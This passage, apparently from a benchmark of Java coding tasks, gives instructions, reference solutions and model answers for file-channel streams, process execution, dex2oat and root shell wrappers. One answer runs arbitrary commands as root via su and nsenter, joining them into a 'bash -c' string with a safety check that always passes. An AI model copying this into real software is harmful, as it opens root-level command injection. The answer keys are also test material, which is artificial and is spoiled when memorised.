stdout;\n            this.stderr = stderr;\n        }\n\n        public String getStdout() {\n            return stdout;\n        }\n\n        public String getStderr() {\n            return stderr;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 28,
    "Instruction": "Task Description: Create utility functions for working with FileChannel in Java NIO to provide OutputStream functionality with optional force-write capability at close.\n\nFunction Description: The provided code consists of three utility functions that work together to create an OutputStream wrapper around a FileChannel, with control over whether changes are forcibly written to disk when closing the stream.\n\nInput:\n1. For newOutputStream:\n   - channel: FileChannel - The FileChannel to wrap with OutputStream functionality\n   - forceAtClose: boolean - Whether to force write changes to disk when closing\n\n2. For newOutputStreamForceAtClose:\n   - p: Path - The file path to open\n   - options: OpenOption... - Variable arguments of file open options\n\n3. For newFileChannel:\n   - p: Path - The file path to open\n   - options: OpenOption... - Variable arguments of file open options\n\nOutput:\n1. For newOutputStream: OutputStream - A new OutputStream instance that writes to the provided FileChannel\n2. For newOutputStreamForceAtClose: OutputStream - A new OutputStream instance that forces writes to disk when closed\n3. For newFileChannel: FileChannel - A new FileChannel instance for the specified path with given options",
    "Canonical_solution": "import java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.io.OutputStream;\nimport java.io.IOException;\n\nstatic OutputStream newOutputStream(FileChannel channel, boolean forceAtClose) {\n    final byte[] single = {0};\n    return new OutputStream() {\n        @Override\n        public void write(int b) throws IOException {\n            single[0] = (byte) b;\n            write(single);\n        }\n\n        @Override\n        public void write(byte[] b, int off, int len) throws IOException {\n            for(; len > 0; ) {\n                final int written = channel.write(ByteBuffer.wrap(b, off, len));\n                off += written;\n                len -= written;\n            }\n        }\n\n        @Override\n        public void close() throws IOException {\n            try (FileChannel c = channel) {\n                if (forceAtClose) {\n                    c.force(true);\n                }\n            }\n        }\n    };\n}\n\nstatic OutputStream newOutputStreamForceAtClose(Path p, OpenOption... options) throws IOException {\n    return newOutputStream(newFileChannel(p, options), true);\n}\n\nstatic FileChannel newFileChannel(Path p, OpenOption... options) throws IOException {\n    return LogUtils.supplyAndLog(LOG,\n        () -> FileChannel.open(p, options),\n        () -> \"FileChannel.open \" + p + \" with options \" + Arrays.asList(options));\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelUtils {\n\n    public static OutputStream newOutputStream(FileChannel channel, boolean forceAtClose) {\n        return new OutputStream() {\n            @Override\n            public void write(int b) throws IOException {\n                channel.write(java.nio.ByteBuffer.wrap(new byte[]{(byte) b}));\n            }\n\n            @Override\n            public void write(byte[] b, int off, int len) throws IOException {\n                channel.write(java.nio.ByteBuffer.wrap(b, off, len));\n            }\n\n            @Override\n            public void flush() throws IOException {\n                channel.force(false);\n            }\n\n            @Override\n            public void close() throws IOException {\n                if (forceAtClose) {\n                    channel.force(true);\n                }\n                channel.close();\n            }\n        };\n    }\n\n    public static OutputStream newOutputStreamForceAtClose(Path p, StandardOpenOption... options) throws IOException {\n        FileChannel channel = newFileChannel(p, options);\n        return newOutputStream(channel, true);\n    }\n\n    public static FileChannel newFileChannel(Path p, StandardOpenOption... options) throws IOException {\n        return FileChannel.open(p, options);\n    }\n}\n```"
  },
  {
    "Task_id": 280,
    "Instruction": "Task Description: Implement a Java function that executes a shell command with root privileges using ProcessBuilder, handles input/output streams, and properly manages process lifecycle and error handling.\n\nFunction Description: The function executes a given shell command with root privileges by spawning a new process through ProcessBuilder. It uses 'su' to gain root access and 'nsenter' to enter the root namespace. The function handles command safety checks, process I/O streams, error redirection, and proper resource cleanup. It returns the command output or error messages.\n\nInput: \n- cmd: String - The shell command to be executed with root privileges\n\nOutput: \n- String - The output of the executed command (stdout) or error message if execution fails. The output string is cleaned to remove trailing newlines and unnecessary error prefixes.\n\nNote: The function includes a safety check (isSafeCommand) to prevent dangerous operations, though its implementation isn't shown in the reference code.",
    "Canonical_solution": "import java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.BufferedReader;\n\npublic static String rootExecCmd(String cmd) {\n    if (!isSafeCommand(cmd)) return \"Cannot exec this command: Dangerous operation\";\n    StringBuilder result = new StringBuilder();\n    ProcessBuilder pb = new ProcessBuilder(\"su\");\n    Process p;\n    DataOutputStream dos = null;\n    DataInputStream dis = null;\n    try {\n        pb.redirectErrorStream(true);\n        p = pb.start();\n        dos = new DataOutputStream(p.getOutputStream());\n        dis = new DataInputStream(p.getInputStream());\n        dos.writeBytes(\"nsenter --mount=/proc/1/ns/mnt -- \" + cmd + \"\\n\");\n        dos.flush();\n        dos.writeBytes(\"exit\\n\");\n        dos.flush();\n        String line;\n        while ((line = dis.readLine()) != null) {\n            result.append(line).append(\"\\n\");\n        }\n        p.waitFor();\n    } catch (Exception e) {\n        if (!cmd.contains(\"nsenter\") && String.valueOf(e).contains(\"nsenter: exec \")) {\n            return String.valueOf(e).replace(\"nsenter: exec \", \"\");\n        } else {\n            return String.valueOf(e);\n        }\n    } finally {\n        if (dos != null) {\n            try {\n                dos.close();\n            } catch (IOException e) {\n                if (!cmd.contains(\"nsenter\") && String.valueOf(e).contains(\"nsenter: exec \")) {\n                    return String.valueOf(e).replace(\"nsenter: exec \", \"\");\n                } else {\n                    return String.valueOf(e);\n                }\n            }\n        }\n        if (dis != null) {\n            try {\n                dis.close();\n            } catch (IOException e) {\n                if (!cmd.contains(\"nsenter\") && String.valueOf(e).contains(\"nsenter: exec \")) {\n                    return String.valueOf(e).replace(\"nsenter: exec \", \"\");\n                } else {\n                    return String.valueOf(e);\n                }\n            }\n        }\n    }\n    if (result.length() > 0) {\n        result = new StringBuilder(result.substring(0, result.length() - 1));\n    }\n    if (!cmd.contains(\"nsenter\") && result.toString().contains(\"nsenter: exec \")) {\n        return result.toString().replace(\"nsenter: exec \", \"\");\n    } else {\n        return result.toString();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\n\npublic class RootCommandExecutor {\n\n    public static String executeRootCommand(String cmd) {\n        if (!isSafeCommand(cmd)) {\n            return \"Error: Command is not safe.\";\n        }\n\n        ProcessBuilder pb = new ProcessBuilder(\"su\", \"-c\", \"nsenter -t 1 -m -u -i -n -p bash -c \\\"\" + cmd + \"\\\"\");\n        pb.redirectErrorStream(true);\n        try {\n            Process process = pb.start();\n            StringBuilder output = new StringBuilder();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n            int exitCode = process.waitFor();\n            if (exitCode == 0) {\n                return output.toString().trim();\n            } else {\n                return \"Error: Command failed with exit code \" + exitCode + \"\\n\" + output.toString().trim();\n            }\n        } catch (IOException | InterruptedException e) {\n            return \"Error: \" + e.getMessage();\n        }\n    }\n\n    private static boolean isSafeCommand(String cmd) {\n        // Placeholder for command safety check logic\n        return true;\n    }\n\n    public static void main(String[] args) {\n        System.out.println(executeRootCommand(\"ls /root\"));\n    }\n}\n```"
  },
  {
    "Task_id": 281,
    "Instruction": "Task Description: Create a function that executes an external process, captures its output (including error streams redirected to standard output), and returns the output as a string.\n\nFunction Description: The function uses Java's ProcessBuilder to start an external process specified by the given command. It redirects the error stream to the standard output stream to capture all output in one place. The function reads the process's output stream line by line, collects it into a string, and waits for the process to complete before returning the collected output.\n\nInput: \n- cmd: String[] - An array of strings representing the command to execute and its arguments.\n\nOutput: \n- String - The combined standard output and error output of the executed process, trimmed of any leading or trailing whitespace.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.concurrent.TimeUnit;\n\npublic static String getProcessOutput(String[] cmd) throws IOException, InterruptedException {\n    ProcessBuilder processBuilder = new ProcessBuilder(cmd);\n    processBuilder.redirectErrorStream(true);\n    Process process = processBuilder.start();\n    StringBuilder processOutput = new StringBuilder();\n    try (BufferedReader processOutputReader = new BufferedReader(\n            new InputStreamReader(process.getInputStream()));) {\n        String readLine;\n        while ((readLine = processOutputReader.readLine()) != null) {\n            processOutput.append(readLine + System.lineSeparator());\n        }\n        process.waitFor();\n    }\n    return processOutput.toString().trim();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class ProcessExecutor {\n    public static String executeCommand(String[] cmd) throws IOException, InterruptedException {\n        StringBuilder output = new StringBuilder();\n        ProcessBuilder pb = new ProcessBuilder(cmd);\n        pb.redirectErrorStream(true);\n        Process process = pb.start();\n\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n        }\n\n        int exitCode = process.waitFor();\n        return output.toString().trim();\n    }\n}\n```"
  },
  {
    "Task_id": 282,
    "Instruction": "Task Description: Create a Java function that executes an external process using ProcessBuilder, captures its output, and handles errors appropriately.\n\nFunction Description: The function executes a shell command constructed from configuration parameters, captures the process's standard output and error streams (merged), waits for the process to complete, and returns the exit status or throws an exception if the process fails. The function handles process initialization, stream reading, and error management.\n\nInput:\n- job: Job<Object> - A job object containing configuration details\n- parameters: Map<String, Object> - A map of parameters used to construct the shell command\n\nOutput:\n- Object - Returns 0 if the process exits successfully, otherwise throws a HugeException containing the exit code and process output\n\nNote: The function includes error handling for process initialization, execution, and stream reading, with all exceptions wrapped in HugeException. The process's working directory is set to executeDir(), and error streams are redirected to standard output.",
    "Canonical_solution": "import java.io.File;\nimport java.io.InputStreamReader;\nimport java.io.LineNumberReader;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic Object call(Job<Object> job, Map<String, Object> parameters) {\n    this.checkAndCollectParameters(parameters);\n    try {\n        this.initializeConfig((ComputerJob) job);\n    } catch (Exception e) {\n        throw new HugeException(\n                \"Failed to initialize computer config file\", e);\n    }\n\n    Map<String, Object> configs = new HashMap<>();\n    configs.putAll(this.commonConfig);\n    configs.putAll(this.checkAndCollectParameters(parameters));\n\n    String[] command = this.constructShellCommands(configs);\n    LOG.info(\"Execute computer job: {}\", String.join(SPACE, command));\n\n    try {\n        ProcessBuilder builder = new ProcessBuilder(command);\n        builder.redirectErrorStream(true);\n        builder.directory(new File(executeDir()));\n\n        Process process = builder.start();\n\n        StringBuilder output = new StringBuilder();\n        try (LineNumberReader reader = new LineNumberReader(\n                new InputStreamReader(\n                        process.getInputStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n        }\n\n        int exitCode = process.waitFor();\n        if (exitCode == 0) {\n            return 0;\n        }\n\n        throw new HugeException(\"The computer job exit with code %s: %s\",\n                                exitCode, output);\n    } catch (HugeException e) {\n        throw e;\n    } catch (Throwable e) {\n        throw new HugeException(\"Failed to execute computer job\", e);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.Map;\n\npublic class ExternalProcessExecutor {\n\n    public static Object executeJob(Job<Object> job, Map<String, Object> parameters) {\n        try {\n            ProcessBuilder pb = new ProcessBuilder();\n            pb.directory(job.executeDir());\n            String command = buildCommand(job, parameters);\n            pb.command(\"sh\", \"-c\", command);\n\n            Process process = pb.start();\n\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            StringBuilder output = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n\n            int exitCode = process.waitFor();\n            if (exitCode == 0) {\n                return 0;\n            } else {\n                throw new HugeException(exitCode, output.toString());\n            }\n        } catch (IOException | InterruptedException e) {\n            throw new HugeException(-1, \"Error executing process: \" + e.getMessage());\n        }\n    }\n\n    private static String buildCommand(Job<Object> job, Map<String, Object> parameters) {\n        // Implement logic to build the shell command based on job and parameters\n        return \"your_command_here\";\n    }\n\n    static class HugeException extends RuntimeException {\n        public HugeException(int errorCode, String message) {\n            super(message + \" (Exit Code: \" + errorCode + \")\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 283,
    "Instruction": "Task Description: Create a Java class that executes shell commands, handling both simple commands and those requiring shell interpretation (with wildcards or special characters). The class should manage process execution, input/output streams, and error handling.\n\nClass Description: ShellCommand is a concrete implementation of AbstractCommand that executes shell commands either directly or through a shell interpreter when needed. It handles command tokenization, process building, and execution status reporting.\n\nAttributes:\n- command: String - The raw shell command to be executed\n- argv: List<String> - The tokenized command arguments, potentially including shell interpreter when needed\n- shellWildcardPattern: Pattern - Compiled regex pattern to detect shell special characters\n\nMethods:\n- ShellCommand(String command) -> None - Constructor that initializes the command and determines if shell interpretation is needed\n- hasWildcard(String command) -> boolean - Checks if the command contains shell wildcard characters that require interpretation\n- tokenize(String s) -> List<String> - Splits a command string into individual tokens for process execution\n- doExecute(ConcurrentTestCommandExecutor executor) -> None - Executes the command using ProcessBuilder, handles I/O streams, and reports execution status",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.io.Reader;\nimport java.io.Writer;\nimport java.util.List;\nimport java.util.regex.Pattern;\n\nprivate final Pattern shellWildcardPattern = Pattern.compile(\"[*?$|<>&]\");\n\nstatic int runAppProcess(\n    ProcessBuilder pb,\n    Logger logger,\n    Reader appInput,\n    Writer appOutput) throws IOException, InterruptedException {\n  pb.redirectErrorStream(true);\n  if (logger != null) {\n    logger.info(\"start process: \" + pb.command());\n  }\n  Process p = pb.start();\n\n  if (appInput != null) {\n    OutputStream out =\n        new BufferedOutputStream(\n            p.getOutputStream(),\n            100 * 1024);\n    int c;\n    while ((c = appInput.read()) != -1) {\n      out.write(c);\n    }\n    out.flush();\n  }\n  if (appOutput != null) {\n    InputStream in =\n        new BufferedInputStream(\n            p.getInputStream(),\n            100 * 1024);\n    int c;\n    while ((c = in.read()) != -1) {\n      appOutput.write(c);\n    }\n    appOutput.flush();\n    in.close();\n  }\n  p.waitFor();\n\n  int status = p.exitValue();\n  if (logger != null) {\n    logger.info(\"exit status=\" + status + \" from \" + pb.command());\n  }\n  return status;\n}\n\nprivate class ShellCommand extends AbstractCommand {\n  private final String command;\n  private List<String> argv;\n\n  private ShellCommand(String command) {\n    this.command = command;\n    boolean needShell = hasWildcard(command);\n    if (needShell) {\n      argv = new ArrayList<>();\n      argv.add(\"/bin/sh\");\n      argv.add(\"-c\");\n      argv.add(command);\n    } else {\n      argv = tokenize(command);\n    }\n  }\n\n  private boolean hasWildcard(String command) {\n    return shellWildcardPattern.matcher(command).find();\n  }\n\n  private List<String> tokenize(String s) {\n    List<String> result = new ArrayList<>();\n    StringTokenizer tokenizer = new StringTokenizer(s);\n    while (tokenizer.hasMoreTokens()) {\n      result.add(tokenizer.nextToken());\n    }\n    return result;\n  }\n\n  protected void doExecute(ConcurrentTestCommandExecutor executor) {\n    Integer threadId = executor.getThreadId();\n    storeMessage(threadId, command);\n\n    ProcessBuilder pb = new ProcessBuilder(argv);\n    pb.directory(scriptDirectory);\n    try {\n      int status = runAppProcess(pb, null, null, getThreadWriter(threadId));\n      if (status != 0) {\n        storeMessage(threadId,\n            \"command \" + command + \": exited with status \" + status);\n      }\n    } catch (Exception e) {\n      storeMessage(threadId,\n          \"command \" + command + \": failed with exception \" + e.getMessage());\n    }\n  }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.regex.Pattern;\n\npublic class ShellCommand extends AbstractCommand {\n    private static final Pattern shellWildcardPattern = Pattern.compile(\"[*?~`'\\\"\\\\\\\\()\\\\[\\\\]{};|&<>$#@!%+^]\");\n    private String command;\n    private List<String> argv;\n\n    public ShellCommand(String command) {\n        this.command = command;\n        this.argv = hasWildcard(command) ? Arrays.asList(\"/bin/sh\", \"-c\", command) : tokenize(command);\n    }\n\n    private boolean hasWildcard(String command) {\n        return shellWildcardPattern.matcher(command).find();\n    }\n\n    private List<String> tokenize(String s) {\n        return Arrays.asList(s.split(\"\\\\s+\"));\n    }\n\n    @Override\n    public void doExecute(ConcurrentTestCommandExecutor executor) {\n        ProcessBuilder pb = new ProcessBuilder(argv);\n        try {\n            Process process = pb.start();\n            handleStreams(process.getInputStream(), executor.getOutStream());\n            handleStreams(process.getErrorStream(), executor.getErrStream());\n            int exitCode = process.waitFor();\n            executor.reportStatus(exitCode == 0 ? \"SUCCESS\" : \"FAILURE\");\n        } catch (IOException | InterruptedException e) {\n            executor.reportStatus(\"ERROR: \" + e.getMessage());\n        }\n    }\n\n    private void handleStreams(InputStream inputStream, Appendable outStream) throws IOException {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            outStream.append(line).append(\"\\n\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 284,
    "Instruction": "Task Description: Create a Java class that facilitates the conversion of DEX files to OAT files using the Android dex2oat tool, handling process execution and stream management.\n\nClass Description: InterpretDex2OatHelper is a utility class that provides functionality to convert Android DEX files to OAT files by invoking the system's dex2oat tool. It handles process creation, stream consumption, and error checking during the conversion process.\n\nAttributes:\n- STREAM_CONSUMER: [Executor] - A single-thread executor used for consuming process output streams asynchronously.\n\nMethods:\n- getCurrentInstructionSet: () -> [String] - Retrieves the current instruction set architecture of the device using reflection.\n- interpretDex2Oat: (String dexFilePath, String oatFilePath) -> [void] - Main method that executes the dex2oat conversion process with appropriate parameters.\n- consumeInputStream: (InputStream is) -> [void] - Helper method that asynchronously consumes an input stream to prevent process blocking.\n\nMethod Details:\n1. getCurrentInstructionSet:\n   - Input: None\n   - Output: String representing the current instruction set\n   - Description: Uses reflection to call VMRuntime.getCurrentInstructionSet()\n\n2. interpretDex2Oat:\n   - Input: \n     - dexFilePath: String - Path to the input DEX file\n     - oatFilePath: String - Path for the output OAT file\n   - Output: void (throws IOException on failure)\n   - Description: \n     - Prepares the dex2oat command with version-specific parameters\n     - Creates and manages the conversion process\n     - Handles stream consumption and process termination\n\n3. consumeInputStream:\n   - Input: \n     - is: InputStream - Stream to be consumed\n   - Output: void\n   - Description: Asynchronously reads and discards stream contents to prevent blocking",
    "Canonical_solution": "import android.os.Build;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.lang.reflect.Method;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.Executor;\nimport java.util.concurrent.Executors;\n\npublic class InterpretDex2OatHelper {\n\n    private static String getCurrentInstructionSet() throws Exception {\n        Class<?> clazz = Class.forName(\"dalvik.system.VMRuntime\");\n        Method currentGet = clazz.getDeclaredMethod(\"getCurrentInstructionSet\");\n        return (String) currentGet.invoke(null);\n    }\n\n    public static void interpretDex2Oat(String dexFilePath, String oatFilePath) throws IOException {\n        String targetISA = null;\n        try {\n            targetISA = getCurrentInstructionSet();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        final File oatFile = new File(oatFilePath);\n        if (!oatFile.exists()) {\n            oatFile.getParentFile().mkdirs();\n        }\n\n        final List<String> commandAndParams = new ArrayList<>();\n        commandAndParams.add(\"dex2oat\");\n\n        if (Build.VERSION.SDK_INT >= 24) {\n            commandAndParams.add(\"--runtime-arg\");\n            commandAndParams.add(\"-classpath\");\n            commandAndParams.add(\"--runtime-arg\");\n            commandAndParams.add(\"&\");\n        }\n        commandAndParams.add(\"--dex-file=\" + dexFilePath);\n        commandAndParams.add(\"--oat-file=\" + oatFilePath);\n        commandAndParams.add(\"--instruction-set=\" + targetISA);\n\n        if (Build.VERSION.SDK_INT > 25) {\n            commandAndParams.add(\"--compiler-filter=quicken\");\n        } else {\n            commandAndParams.add(\"--compiler-filter=interpret-only\");\n        }\n\n        final ProcessBuilder pb = new ProcessBuilder(commandAndParams);\n        pb.redirectErrorStream(true);\n        final Process dex2oatProcess = pb.start();\n\n        StreamConsumer.consumeInputStream(dex2oatProcess.getInputStream());\n        StreamConsumer.consumeInputStream(dex2oatProcess.getErrorStream());\n\n        try {\n            final int ret = dex2oatProcess.waitFor();\n            if (ret != 0) {\n                throw new IOException(\"dex2oat works unsuccessfully, exit code: \" + ret);\n            }\n        } catch (InterruptedException e) {\n            throw new IOException(\"dex2oat is interrupted, msg: \" + e.getMessage(), e);\n        }\n    }\n\n    private static class StreamConsumer {\n        static final Executor STREAM_CONSUMER = Executors.newSingleThreadExecutor();\n\n        static void consumeInputStream(final InputStream is) {\n            STREAM_CONSUMER.execute(new Runnable() {\n                @Override\n                public void run() {\n                    if (is == null) {\n                        return;\n                    }\n                    final byte[] buffer = new byte[256];\n                    try {\n                        while ((is.read(buffer)) > 0) {\n                            // To satisfy checkstyle rules.\n                        }\n                    } catch (IOException ignored) {\n                        // Ignored.\n                    } finally {\n                        try {\n                            is.close();\n                        } catch (Exception ignored) {\n                            // Ignored.\n                        }\n                    }\n                }\n            });\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class InterpretDex2OatHelper {\n    private static final ExecutorService STREAM_CONSUMER = Executors.newSingleThreadExecutor();\n\n    public String getCurrentInstructionSet() throws Exception {\n        Class<?> vmRuntimeClass = Class.forName(\"dalvik.system.VMRuntime\");\n        Object vmRuntimeInstance = vmRuntimeClass.getMethod(\"getRuntime\").invoke(null);\n        return (String) vmRuntimeClass.getMethod(\"getCurrentInstructionSet\").invoke(vmRuntimeInstance);\n    }\n\n    public void interpretDex2Oat(String dexFilePath, String oatFilePath) throws IOException {\n        String instructionSet = getCurrentInstructionSet();\n        ProcessBuilder processBuilder = new ProcessBuilder(\n            \"/system/bin/dex2oat\",\n            \"--dex-file=\" + dexFilePath,\n            \"--oat-file=\" + oatFilePath,\n            \"--instruction-set=\" + instructionSet,\n            \"--compiler-filter=interpret-only\"\n        );\n        Process process = processBuilder.start();\n\n        STREAM_CONSUMER.execute(() -> consumeInputStream(process.getInputStream()));\n        STREAM_CONSUMER.execute(() -> consumeInputStream(process.getErrorStream()));\n\n        try {\n            int exitCode = process.waitFor();\n            if (exitCode != 0) {\n                throw new IOException(\"dex2oat conversion failed with exit code \" + exitCode);\n            }\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new IOException(\"dex2oat conversion interrupted\", e);\n        }\n    }\n\n    private void consumeInputStream(InputStream is) {\n        try {\n            byte[] buffer = new byte[4096];\n            while (is.read(buffer) != -1) {\n                // Discard read bytes\n            }\n        } catch (IOException e) {\n            // Handle exception as needed\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 286,
    "Instruction": "Task Description: Create a Java class that manages an interactive shell process (either regular or root) with proper stream handling, command execution, and event notification capabilities.\n\nClass Description: The ShellStream class provides an interface to execute commands in a shell process (sh or su) while managing input/output streams and notifying listeners about process events. It handles command execution synchronization, stream monitoring, and process lifecycle management.\n\nAttributes:\n- mConnection: Process - The running shell process instance\n- mStdInput: DataOutputStream - Stream for writing commands to the process\n- mStdOutput: BufferedReader - Stream for reading process output\n- mStdOutputWorker: Thread - Worker thread for monitoring output stream\n- mListener: OnStreamListener - Callback interface for process events\n- mCounter: Counter - Thread-safe counter for active commands\n- mLock: Object - Synchronization lock object\n- mIsActive: Boolean - Flag indicating if the process is active\n- mIsRoot: Boolean - Flag indicating if using root shell (su)\n- mCommandEnd: String - Unique marker for command termination\n\nMethods:\n- ShellStream(Boolean requestRoot, OnStreamListener listener) -> void - Constructor that initializes the shell process (root or regular) and sets up stream handlers\n- execute(String command) -> void - Executes a shell command asynchronously and tracks its completion\n- waitFor() -> Boolean - Waits indefinitely for all commands to complete\n- waitFor(Integer timeout) -> Boolean - Waits with timeout for all commands to complete\n- waitFor(Integer timeout, Integer index) -> Boolean - Internal wait method with timeout and counter adjustment\n- isActive() -> Boolean - Returns if the shell process is active\n- isRunning() -> Boolean - Returns if any commands are currently executing\n- isRoot() -> Boolean - Returns if using root shell\n- destroy() -> void - Cleanly terminates the shell process and releases resources\n\nNested Interfaces:\n- OnStreamListener: Interface for process event callbacks\n  - onStreamStart(): Notifies when command execution starts\n  - onStreamInput(String): Provides process output lines\n  - onStreamStop(Integer): Notifies when command completes with exit code\n  - onStreamDied(): Notifies when process terminates unexpectedly\n\nNested Classes:\n- Counter: Thread-safe counter implementation\n  - size() -> Integer: Gets current count\n  - encrease() -> Integer: Increments counter\n  - decrease() -> Integer: Decrements counter\n  - reset() -> void: Resets counter to zero",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport android.util.Log;\n\npublic class ShellStream {\n    public static final String TAG = Common.TAG + \".ShellStream\";\n    \n    protected Process mConnection;\n    protected DataOutputStream mStdInput;\n    protected BufferedReader mStdOutput;\n    protected Thread mStdOutputWorker;\n    protected OnStreamListener mListener;\n    protected final Counter mCounter = new Counter();\n    protected final Object mLock = new Object();\n    protected Boolean mIsActive = false;\n    protected Boolean mIsRoot = false;\n    protected String mCommandEnd = \"EOL:a00c38d8:EOL\";\n    \n    protected static class Counter {\n        private volatile Integer mCount = 0;\n        private volatile Object mLock = new Object();\n        \n        public Integer size() {\n            synchronized(mLock) {\n                return mCount;\n            }\n        }\n        \n        public Integer encrease() {\n            synchronized(mLock) {\n                return (mCount += 1);\n            }\n        }\n        \n        public Integer decrease() {\n            synchronized(mLock) {\n                return mCount > 0 ? (mCount -= 1) : (mCount = 0);\n            }\n        }\n        \n        public void reset() {\n            synchronized(mLock) {\n                mCount = 0;\n            }\n        }\n    }\n    \n    public static interface OnStreamListener {\n        public void onStreamStart();\n        public void onStreamInput(String outputLine);\n        public void onStreamStop(Integer resultCode);\n        public void onStreamDied();\n    }\n    \n    public ShellStream(Boolean requestRoot, OnStreamListener listener) {\n        try {\n            if(Common.DEBUG)Log.d(TAG, \"Construct: Establishing a new shell stream\");\n            \n            ProcessBuilder builder = new ProcessBuilder(requestRoot ? \"su\" : \"sh\");\n            builder.redirectErrorStream(true);\n            \n            mIsRoot = requestRoot;\n            mIsActive = true;\n            mListener = listener;\n            mConnection = builder.start();\n            mStdInput = new DataOutputStream(mConnection.getOutputStream());\n            mStdOutput = new BufferedReader(new InputStreamReader(mConnection.getInputStream()));\n            \n            mStdOutputWorker = new Thread() {\n                @Override\n                public void run() {\n                    String output = null;\n                    \n                    try {\n                        while (mIsActive && (output = mStdOutput.readLine()) != null) {\n                            if (mListener != null && mCounter.size() > 0) {\n                                if (output.contains(mCommandEnd)) {\n                                    Integer result = 0;\n                                    \n                                    try {\n                                        if (output.startsWith(mCommandEnd)) {\n                                            result = Integer.parseInt(output.substring(mCommandEnd.length()+1));\n                                            \n                                        } else {\n                                            result = 1;\n                                        }\n                                        \n                                    } catch (Throwable e) {\n                                        Log.w(TAG, e.getMessage(), e);\n                                    }\n                                    \n                                    mListener.onStreamStop(result);\n                                    mCounter.decrease();\n                                    \n                                    synchronized(mLock) {\n                                        mLock.notifyAll();\n                                    }\n                                    \n                                } else {\n                                    mListener.onStreamInput(output);\n                                }\n                            }\n                        }\n                        \n                    } catch (IOException e) {\n                        Log.w(TAG, e.getMessage(), e); output = null;\n                    }\n                    \n                    if (output == null) {\n                        ShellStream.this.destroy();\n                    }\n                }\n            };\n            \n            mStdOutputWorker.start();\n            \n        } catch (IOException e) {\n            Log.w(TAG, e.getMessage(), e); mIsActive = false;\n        }\n    }\n    \n    public synchronized void execute(final String command) {\n        final Object lock = new Object();\n        \n        new Thread() {\n            @Override\n            public void run() {\n                mCounter.encrease();\n                \n                synchronized(lock) {\n                    lock.notifyAll();\n                }\n                \n                synchronized(mLock) {\n                    if (waitFor(0, -1)) {\n                        mListener.onStreamStart();\n                        \n                        String input = command + \"\\n\";\n                        input += \"    echo \" + mCommandEnd + \" $?\\n\";\n                        \n                        try {\n                            mStdInput.write( input.getBytes() );\n                            \n                            if (mStdInput != null) {\n                                mStdInput.flush();\n                            }\n                            \n                        } catch (IOException e) {\n                            Log.w(TAG, e.getMessage(), e);\n                        }\n                    }\n                }\n            }\n            \n        }.start();\n        \n        synchronized (lock) {\n            try {\n                lock.wait();\n                \n            } catch (InterruptedException e) {}\n        }\n    }\n    \n    public Boolean waitFor() {\n        return waitFor(0, 0);\n    }\n    \n    public Boolean waitFor(Integer timeout) {\n        return waitFor(timeout, 0);\n    }\n    \n    protected Boolean waitFor(Integer timeout, Integer index) {\n        Integer counter = mCounter.size()+index;\n        \n        if (counter > 0) {\n            Long timeoutMilis = timeout > 0 ? System.currentTimeMillis() + timeout : 0L;\n            \n            synchronized(mLock) {\n                while (mCounter.size() > 0 && mIsActive) {\n                    try {\n                        counter -= 1;\n                        \n                        mLock.wait(timeout.longValue());\n                        \n                        if (timeout > 0 && System.currentTimeMillis() >= timeoutMilis) {\n                            return mCounter.size() == 0 && mIsActive;\n                            \n                        } else if (counter <= 0) {\n                            return mIsActive;\n                        }\n                        \n                    } catch 